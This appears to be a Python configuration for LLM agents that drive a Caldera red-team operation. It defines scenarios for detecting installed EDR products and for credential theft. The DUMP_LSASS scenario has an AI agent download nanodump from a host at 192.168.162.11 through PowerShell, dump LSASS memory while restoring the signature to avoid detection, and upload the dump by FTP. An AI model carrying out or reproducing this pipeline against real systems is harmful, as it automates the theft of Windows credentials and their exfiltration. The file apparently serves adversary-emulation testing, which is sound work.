from agents.text_agents import text_analyst_agent, internet_agent
from agents.caldera_agents import caldera_agent

actions = {
    "COLLECT_CALDERA_INFO": [
        {
            "message": "Get the ID of the active Caldera operation.",
            "summary_method": "last_msg",
            "agent": caldera_agent,
        },
        {
            "message": "Get the PAW of the active Caldera agent by calling /api/v2/agents.",
            "summary_method": "last_msg",
            "carryover": "summarize The ID of the active Caldera operation and PAW of the agent in a table.",
            "agent": caldera_agent,
        },
    ],
    "TEST": [
        {
            "message": "Download https://raw.githubusercontent.com/tsale/EDR-Telemetry/main/README.md",
            "summary_method": "reflection_with_llm",
            "carryover": "Replace this placeholder with the list of ALL security products mentioned in the README.",
            "agent": internet_agent,
        },
        {
            "message": "List all Windows services on the active Caldera agent",
            "summary_method": "reflection_with_llm",
            "carryover": "Replace this placeholder with the list of ALL Windows services running on the Caldera agent.",
            "agent": caldera_agent,
        },
    ],
    "DETECT_EDR": [
        {
            "message": "Download https://raw.githubusercontent.com/tsale/EDR-Telemetry/main/README.md",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with the list of ALL security products mentioned in the README.",
            "agent": internet_agent,
        },
        {
            "message": "List all Windows services on the active Caldera agent",
            "summary_method": "last_msg",
            "carryover": "Replace this placeholder with the list of ALL Windows service names WITHOUT WINDOWS in their path name.",
            "agent": caldera_agent,
        },
        {
            "message": """Identify which security services are likely running on the active Caldera agent based on the provided context.
            Do a fuzzy match comparing the list of running services with the list of security products. Partial matches are OK too.""",
            "summary_method": "reflection_with_llm",
            "agent": text_analyst_agent,
        },
    ],
    "DOWNLOAD_AND_RUN_NANODUMP": [
        {
            "message": "Use powershell to download http://192.168.162.11:8800/nanodump.x64.exe if it does not exist yet, and save it to C:\\temp of the active agent.",
            "agent": caldera_agent,
        },
        {
            "message": "A complete list of all the available nanodump flags from https://raw.githubusercontent.com/fortra/nanodump/main/README.md",
            "agent": internet_agent,
        },
        {
            "message": "Use powershell to run the downloaded nanodump executable to dump LSASS without forking and pay attention to restoring the signature. Write the dump to C:\\temp.",
            "carryover": [
                "A complete list of all the available nanodump flags and their short descriptions.",
                "The full local path to the downloaded nanodump executable.",
            ],
            "agent": caldera_agent,
        },
        {
            "message": "Upload the dumped LSASS file using FTP.",
            "agent": caldera_agent,
        },
    ],
}

scenarios = {
    "TEST": ["COLLECT_CALDERA_INFO", "TEST"],
    "CALDERA_INFO": ["COLLECT_CALDERA_INFO"],
    "DUMP_LSASS": [
        "COLLECT_CALDERA_INFO",
        "DOWNLOAD_AND_RUN_NANODUMP",
    ],
    "DETECT_EDR": ["COLLECT_CALDERA_INFO", "DETECT_EDR"],
}
